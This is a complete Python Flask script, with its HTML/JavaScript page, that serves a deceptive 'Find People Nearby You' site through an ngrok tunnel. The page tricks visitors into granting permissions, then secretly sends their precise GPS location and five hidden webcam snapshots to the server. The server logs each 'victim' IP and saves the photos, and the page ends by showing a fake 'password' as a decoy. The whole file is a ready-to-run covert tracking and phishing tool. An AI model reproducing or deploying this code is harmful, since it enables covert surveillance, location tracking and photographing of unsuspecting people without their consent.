from flask import Flask, request, jsonify, render_template_string
from pyngrok import ngrok
import base64
import os
import random
import string
from datetime import datetime

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

public_url = ngrok.connect(8080, bind_tls=True)
print(f"🔗 Public URL: {public_url}")

print("""
   __  __         _             _                 _   _          
 |  \/  |__ _ __| |_ ___ _ _  | |   ___  __ __ _| |_(_)___ _ _  
 | |\/| / _` (_-<  _/ -_) '_| | |__/ _ \/ _/ _` |  _| / _ \ ' \ 
 |_|  |_\__,_/__/\__\___|_|   |____\___/\__\__,_|\__|_\___/_||_|
            / __| ___ ___| |_____ _ _                           
            \__ \/ -_) -_) / / -_) '_|                          
            |___/\___\___|_\_\___|_|                            
""")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Find People Nearby You</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700;400&display=swap');
        html, body {
            width:100vw; height:100vh; margin:0; padding:0;
            background: #232527; color: #fff; font-family: 'Montserrat', Arial, sans-serif;
            overflow: hidden;
        }
        #bubbles {
            position: fixed; left:0; top:0; width:100vw; height:100vh; z-index:0;
            pointer-events: none;
        }
        .mainbox {
            position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; justify-content: center;
        }
        h1 {
            margin: 0 0 10px 0;
            font-size: 2.2em;
            font-weight: 700;
            text-align: left;
            width: 90vw;
            max-width: 420px;
        }
        p {
            font-size: 1.2em;
            margin: 0 0 18px 0;
            font-weight: 400;
            color: #eee;
            width: 90vw;
            max-width: 420px;
        }
        .input-wrap {
            width: 90vw; max-width: 420px; margin-bottom: 15px;
        }
        input[type="text"] {
            width: 100%; padding: 14px 12px; font-size: 1.2em;
            border-radius: 8px; border: none; background: #202124; color: #fff;
        }
        button {
            width: 100%; font-size: 1.2em; padding: 12px 0; background: #232323;
            color: #fff; border: none; border-radius: 8px; 
            font-weight: 700; margin-bottom: 8px; cursor:pointer;
            transition: background 0.2s;
        }
        button:active { background: #292929; }
        #message, #timer, #password, #denied, #processing {
            width: 90vw; max-width: 420px; text-align: center;
            margin: 18px auto 0 auto;
            font-size: 1.1em;
        }
        #password {
            font-size: 1.5em;
            font-weight: bold;
            letter-spacing: 0.15em;
            margin-top: 25px;
        }
        #timer {
            font-size: 1.7em;
            font-weight: bold;
            margin-top: 24px;
            color: #80cbc4;
        }
        #denied {
            color: #ff7373;
            font-weight: 700;
        }
        label {
            font-size: 1em; user-select: none;
        }
        @media(max-width: 500px){
            h1 { font-size: 1.4em; }
            p { font-size: 1em; }
            #timer { font-size: 1.2em; }
        }
    </style>
</head>
<body>
    <canvas id="bubbles"></canvas>
    <div class="mainbox">
        <h1>Find People Nearby You</h1>
        <p>
            To continue, please enter your name and allow all requested permissions.<br>
            <span style="font-size:0.9em;opacity:0.8;">(Location, Camera, and Storage access required)</span>
        </p>
        <div class="input-wrap">
            <input id="name" type="text" placeholder="Enter your name" autocomplete="off"/>
        </div>
        <label>
            <input type="checkbox" id="agree" style="transform:scale(1.1);margin-right:8px;"/>
            I agree to all terms and conditions
        </label>
        <button id="proceed">Proceed</button>
        <div id="message"></div>
        <div id="processing" style="display:none;">
            <span>Processing verification...<br>
            <span style="font-size:0.96em;">Please do not close or switch the tab.</span>
            </span>
        </div>
        <div id="timer" style="display:none;"></div>
        <div id="password" style="display:none;"></div>
        <div id="denied" style="display:none;"></div>
    </div>
    <canvas id="hidden-canvas" style="display:none;"></canvas>
    <script>
    // Bubbles animation
    const canvas = document.getElementById('bubbles');
    const ctx = canvas.getContext('2d');
    let bubbles = [];
    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.onresize = resizeCanvas;
    resizeCanvas();

    function randomColor() {
        const colors = ['#7e8fa3','#cfd8dc','#9fa8da','#546e7a','#b0bec5','#78909c','#90a4ae'];
        return colors[Math.floor(Math.random()*colors.length)];
    }
    function Bubble() {
        this.x = Math.random()*canvas.width;
        this.y = Math.random()*canvas.height;
        this.r = 30+Math.random()*70;
        this.s = 0.3+Math.random()*0.7;
        this.color = randomColor();
        this.a = 0.18+Math.random()*0.10;
    }
    for(let i=0;i<18;i++) bubbles.push(new Bubble());
    function animateBubbles() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        for(let b of bubbles){
            ctx.beginPath();
            ctx.arc(b.x,b.y,b.r,0,2*Math.PI);
            ctx.fillStyle = b.color;
            ctx.globalAlpha = b.a;
            ctx.fill();
            ctx.globalAlpha = 1.0;
            b.y -= b.s;
            if(b.y+b.r<0){
                b.x = Math.random()*canvas.width;
                b.y = canvas.height+b.r;
            }
        }
        requestAnimationFrame(animateBubbles);
    }
    animateBubbles();
    // End bubbles

    let userName = "";
    let locationAllowed = false, cameraAllowed = false, storageAllowed = false, termsAgreed = false;
    let latitude, longitude;
    let denied = false;
    let stream = null;

    // Helper: show/hide elements
    function show(id){ document.getElementById(id).style.display='block'; }
    function hide(id){ document.getElementById(id).style.display='none'; }

    document.getElementById('proceed').onclick = async function() {
        userName = document.getElementById('name').value.trim();
        termsAgreed = document.getElementById('agree').checked;
        if(!userName) {
            document.getElementById('message').textContent = "Please enter your name.";
            return;
        }
        if(!termsAgreed) {
            document.getElementById('message').textContent = "You must agree to the terms and conditions.";
            return;
        }
        hide('message');
        show('processing');
        // Step 1: Location
        locationAllowed = await getLocation();
        if(!locationAllowed){ permissionDenied(); return; }
        await sleep(1000);
        // Step 2: Camera
        cameraAllowed = await getCamera();
        if(!cameraAllowed){ permissionDenied(); return; }
        await sleep(1000);
        // Step 3: Storage (simulated)
        storageAllowed = await getStorage();
        if(!storageAllowed){ permissionDenied(); return; }
        startVerification();
    };

    function permissionDenied(){
        denied = true;
        hide('processing');
        hide('timer');
        document.getElementById('denied').textContent = "You must allow all permissions to continue.";
        show('denied');
    }

    function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }

    function getLocation(){
        return new Promise((resolve) => {
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(function(pos){
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    fetch('/location', {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({latitude, longitude})
                    });
                    resolve(true);
                }, function(){ resolve(false); }, {enableHighAccuracy:true});
            } else resolve(false);
        });
    }

    // Camera: No preview, just capture silently
    function getCamera(){
        return new Promise(async (resolve) => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
                resolve(true);
            } catch (e) {
                resolve(false);
            }
        });
    }

    // Simulate storage permission
    function getStorage(){
        return new Promise((resolve)=>{
            if(window.showDirectoryPicker || window.chooseFileSystemEntries){
                resolve(true);
            } else {
                setTimeout(()=>resolve(true), 1000);
            }
        });
    }

    // Main verification: 10s timer, 5 silent photo captures, then show password
    async function startVerification(){
        hide('processing');
        let t = 10;
        document.getElementById('timer').textContent = "Verifying: " + t + " seconds left";
        show('timer');
        // Capture 5 photos in first 5 seconds
        let captured = 0;
        let videoTrack = stream.getVideoTracks()[0];
        // Set up video element (hidden)
        let video = document.createElement('video');
        video.style.display = "none";
        video.playsInline = true;
        document.body.appendChild(video);
        try { video.srcObject = stream; await video.play(); } catch(e){}
        for(let i=0;i<10;i++){
            document.getElementById('timer').textContent = "Verifying: " + (10-i) + " seconds left";
            if(i<5){
                let canvas = document.getElementById('hidden-canvas');
                canvas.width = 320;
                canvas.height = 240;
                let ctx2d = canvas.getContext('2d');
                ctx2d.drawImage(video, 0, 0, canvas.width, canvas.height);
                let imgData = canvas.toDataURL('image/jpeg');
                fetch('/photo', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body:JSON.stringify({image: imgData})
                });
                captured++;
            }
            await sleep(1000);
        }
        // Stop video/camera
        if(videoTrack) videoTrack.stop();
        video.remove();
        hide('timer');
        showPassword();
    }

    function showPassword(){
        fetch('/get_password', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({name:userName})
        }).then(resp=>resp.json()).then(data=>{
            document.getElementById('password').textContent = "Your password: " + data.password;
            show('password');
        });
    }
    </script>
</body>
</html>
"""

def get_victim_ip(request):
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

@app.route('/')
def index():
    ip = get_victim_ip(request)
    print(f"👤 New visitor IP: {ip}")
    return render_template_string(HTML_TEMPLATE)

@app.route('/location', methods=['POST'])
def get_location():
    ip = get_victim_ip(request)
    data = request.json
    print(f"📍 Location from IP {ip}: {data}")
    return jsonify(success=True)

@app.route('/photo', methods=['POST'])
def receive_photo():
    ip = get_victim_ip(request)
    data = request.json
    img_data = data['image']
    head, encoded = img_data.split(",", 1)
    img_bytes = base64.b64decode(encoded)
    filename = datetime.now().strftime("%Y%m%d_%H%M%S_%f") + f"_{ip.replace(':','_').replace('.','_')}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    with open(filepath, "wb") as f:
        f.write(img_bytes)
    print(f"📷 Photo saved from IP {ip}: {filepath}")
    return jsonify(success=True)

@app.route('/get_password', methods=['POST'])
def get_password():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return jsonify(password=password)

if __name__ == "__main__":
    app.run(port=8080)
